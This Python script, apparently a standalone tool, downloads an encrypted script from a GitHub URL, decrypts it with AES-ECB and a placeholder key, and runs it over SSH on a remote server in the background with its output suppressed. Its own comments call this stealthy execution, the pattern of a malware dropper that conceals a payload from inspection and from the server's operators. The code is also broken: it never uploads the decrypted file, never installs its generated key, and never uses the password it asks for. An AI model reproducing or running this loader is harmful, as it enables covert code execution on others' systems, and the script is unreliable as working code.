import os
import paramiko
import getpass
import requests
import subprocess
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64decode
import time

# Generate SSH key pair (if not already created)
def generate_ssh_key(key_path, passphrase=None):
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend

    if not os.path.exists(key_path):
        os.makedirs(os.path.dirname(key_path), exist_ok=True)
        print(f"Generating SSH key pair at {key_path}")
        
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
        
        with open(key_path, 'wb') as private_pem:
            private_pem.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.BestAvailableEncryption(passphrase.encode()) if passphrase else serialization.NoEncryption()
            ))

        public_key = private_key.public_key()
        with open(f"{key_path}.pub", 'wb') as pubkey_file:
            pubkey_file.write(public_key.public_bytes(
                encoding=serialization.Encoding.OpenSSH,
                format=serialization.PublicFormat.OpenSSH
            ))

        print(f"SSH key pair generated at {key_path} and {key_path}.pub")
    else:
        print(f"SSH key already exists at {key_path}")

# Fetch and decrypt script from GitHub (Encrypted Source)
def fetch_and_decrypt_script(github_url, encrypted_path, decryption_key):
    try:
        print(f"Fetching encrypted script from {github_url}...")
        response = requests.get(github_url)
        if response.status_code == 200:
            with open(encrypted_path, 'wb') as file:
                file.write(response.content)
            print(f"Encrypted script downloaded to {encrypted_path}")
            # Decrypt the script
            decrypt_script(encrypted_path, decryption_key)
        else:
            print(f"Failed to fetch script from GitHub, status code: {response.status_code}")
    except Exception as e:
        print(f"Error fetching script: {e}")

# Decrypt the downloaded script
def decrypt_script(encrypted_path, decryption_key):
    # Assuming AES encryption and ECB mode for simplicity (other modes can be used)
    with open(encrypted_path, 'rb') as f:
        encrypted_data = f.read()

    cipher = Cipher(algorithms.AES(decryption_key), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Save the decrypted script to a new file
    decrypted_path = encrypted_path.replace(".enc", "")  # Remove '.enc' extension
    with open(decrypted_path, 'wb') as f:
        f.write(decrypted_data)
    
    print(f"Decrypted script saved to {decrypted_path}")

# Execute the script stealthily on the remote server (background execution)
def execute_script_stealthily(client, script_path):
    # Use nohup to run the script in the background, preventing output to terminal
    command = f"nohup {script_path} > /dev/null 2>&1 &"
    stdin, stdout, stderr = client.exec_command(command)
    stdout.channel.recv_exit_status()  # Wait for command to finish
    print(f"Script executed stealthily in the background on the server")

# Main function to set up and run everything
def main():
    # User Input
    server_ip = input("Enter the remote server IP: ")
    remote_username = input("Enter the remote username for SSH: ")
    password = getpass.getpass(f"Enter password for {remote_username}: ")
    
    # Define paths for SSH keys
    key_path = str(Path.home() / ".ssh" / f"{remote_username}_id_rsa")
    
    # Generate SSH key if not already done
    passphrase = getpass.getpass("Enter passphrase for SSH key encryption (leave empty for no passphrase): ")
    generate_ssh_key(key_path, passphrase)
    
    # GitHub URL for the encrypted script
    github_url = input("Enter the GitHub URL for the encrypted script: ")
    encrypted_script_path = "/tmp/script.enc"  # Temp path for encrypted script on the server
    
    # Define the decryption key (This should be a secure, shared key)
    decryption_key = b64decode("your_base64_encrypted_decryption_key_here")  # Example of using base64 encoding for key

    # Fetch, decrypt, and prepare the script
    fetch_and_decrypt_script(github_url, encrypted_script_path, decryption_key)

    # SSH connection setup
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Load the SSH private key for authentication
    private_key = paramiko.RSAKey.from_private_key_file(key_path, password=passphrase)
    
    # Connect to the remote server
    client.connect(server_ip, username=remote_username, pkey=private_key)
    print(f"Connected to {server_ip} with SSH key.")
    
    # Execute the decrypted script stealthily
    execute_script_stealthily(client, encrypted_script_path.replace(".enc", ""))
    
    # Close the SSH connection
    client.close()
    print(f"Connection closed.")

# Run the main function
if __name__ == "__main__":
    main()
